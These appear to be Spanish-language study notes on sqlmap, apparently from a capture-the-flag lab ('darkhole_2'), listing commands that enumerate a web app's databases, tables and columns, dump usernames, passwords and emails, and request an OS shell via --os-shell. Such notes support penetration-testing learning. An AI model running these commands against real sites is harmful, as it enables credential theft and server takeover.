___
- tags: #sqlmap
___
## Qué es?
Es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyecciones SQL en aplicaciones web.

## Comandos
```txt
# tirando ataque con sqlmap para extraer todas las bases de datos (--dbs) indicandole que pruebe solo mysql (--dbs mysql) y que use los parámetros por defecto (--batch)
sqlmap -u "http://192.168.1.18/dashboard.php?id=1" --dbs --cookie "PHPSESSID=hie6r4p90dmd14nd32hmsf52qu"  --dbs --dbms mysql --batch

# nos devuelve todas las tables
sqlmap -u "http://192.168.1.18/dashboard.php?id=1" --cookie "PHPSESSID=hie6r4p90dmd14nd32hmsf52qu"  -D darkhole_2 --dbms mysql --batch --tables

# nos devuelve las columnas
sqlmap -u "http://192.168.1.18/dashboard.php?id=1" --cookie "PHPSESSID=hie6r4p90dmd14nd32hmsf52qu"  -D darkhole_2 --dbms mysql --batch -T users --columns

# dump de data
sqlmap -u "http://192.168.1.18/dashboard.php?id=1" --cookie "PHPSESSID=hie6r4p90dmd14nd32hmsf52qu"  -D darkhole_2 --dbms mysql --batch -T users -C username,password,email --dump

# --os-shell nos da una shell si es que lo permite
sqlmap -u "http://192.168.1.18/dashboard.php?id=1" --cookie "PHPSESSID=hie6r4p90dmd14nd32hmsf52qu" --os-shell --batch
```